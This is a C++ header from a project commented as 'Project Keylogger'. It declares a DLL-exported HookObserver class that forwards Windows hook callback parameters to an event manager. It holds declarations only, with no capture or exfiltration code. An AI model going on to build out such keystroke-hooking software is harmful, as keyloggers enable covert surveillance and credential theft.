/**
 *									Project Keylogger
 */


#ifndef								_HOOKOBSERVER_H
#define								_HOOKOBSERVER_H

#include							"EventManager.h"

class	__declspec(dllexport)		HookObserver {

public:     
    HookObserver(EventManager&);
    void							update(const LPARAM, const WPARAM) const;

private: 
    const EventManager&					_eventManager;
};

#endif //_HOOKOBSERVER_H